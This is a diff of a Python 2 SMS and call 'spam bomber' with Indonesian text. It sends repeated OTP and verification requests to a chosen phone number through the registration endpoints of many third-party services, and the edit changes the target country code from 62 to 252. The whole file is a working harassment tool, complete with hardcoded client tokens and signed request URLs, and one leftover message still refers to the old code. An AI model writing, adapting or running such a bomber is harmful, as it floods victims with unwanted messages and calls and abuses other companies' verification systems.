@@ -33,7 +33,7 @@ def input():
   if len(nom) < 5:
     print "%s[%s!%s] %sMasukkan nomor target dengan benar!!"%(pu,me,pu,me)
     input()
-  elif nom.startswith(tuple(["62","+62","0"])):
+  elif nom.startswith(tuple(["252","+252","0"])):
     print "%s[%s!%s] %sMasukkan nomor tanpa 62, +62, ataupun 0\n%s[%s!%s] %sContoh : 85877162199"%(pu,me,pu,ku,pu,me,pu,ku)
     input()
   else:
@@ -42,7 +42,7 @@ def input():
     main()
 #-------------------------------SPAM Function-------------------------------------------
 def asakita():
-  data={'username':'62'+nom}
+  data={'username':'252'+nom}
   h = requests.post("https://www.asakita.id/api/auth/register/otp",headers={'User-Agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'},data=data).text
   if 'MOBILE' in h:
    sukses("1","sms","asakita")
@@ -74,13 +74,13 @@ def wintershop():
  else:
   gagal("5","call","wintershop")
 def datesy():
- to = requests.post("https://www.datesy.com/",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'62','number':nom,'ppclienttoken':'f61627ef220c356b6bf10e28a948c5e6'})
+ to = requests.post("https://www.datesy.com/",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'252','number':nom,'ppclienttoken':'f61627ef220c356b6bf10e28a948c5e6'})
  if json.loads(to.text)["success"] == True:
   sukses("6","sms","datesy")
  else:
   gagal("6","sms","datesy")
 def thaifriendly():
- tes = requests.post("https://www.thaifriendly.com/pl/index.php",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'62','number':nom,'ppclienttoken':'igq39qdc9rwk2ax1zrgdq'})
+ tes = requests.post("https://www.thaifriendly.com/pl/index.php",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'252','number':nom,'ppclienttoken':'igq39qdc9rwk2ax1zrgdq'})
  if json.loads(tes.text)["success"] == True:
   sukses("7","sms","thaifriendly")
  else:
@@ -252,7 +252,7 @@ def duitqu():
  tes = requests.get("https://appapi.duitqu.id/api/v1/custom/send_verify_code?mobile=62%s&af_id=1603327368446-6560442845592783226&app=duitqu&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=ccvIIClr0Sw&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10102&sign=1B8BE88D093027E0CD9970C48DCA3F86EDE31C08"%nom)
  sukses("24","sms","duiqu")
 def primacash():
-# uhu = requests.post("https://db.ksppus.co.id/indonesia_loan/user/get_validate_code",headers={'user-agent':'okhttp/3.14.4'},data=json.dumps({'phone':'62'+nom})).text
+# uhu = requests.post("https://db.ksppus.co.id/indonesia_loan/user/get_validate_code",headers={'user-agent':'okhttp/3.14.4'},data=json.dumps({'phone':'252'+nom})).text
 # if json.loads(uhu)["success"] == True:
   sukses("25","sms","primacash")
  #else:
